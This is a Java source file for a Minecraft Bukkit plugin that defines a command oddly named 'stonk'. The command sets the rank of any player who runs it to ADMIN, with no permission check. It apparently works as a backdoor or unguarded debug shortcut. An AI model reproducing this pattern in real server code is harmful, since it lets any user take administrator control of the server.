package sbsandbox.sbsandbox.commands;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import sbsandbox.sbsandbox.Rank;

public class stonk implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!(sender instanceof Player)) return true;
        Player player = ((Player) sender);
        Rank.ADMIN.setRank(player);
        return true;
    }
}
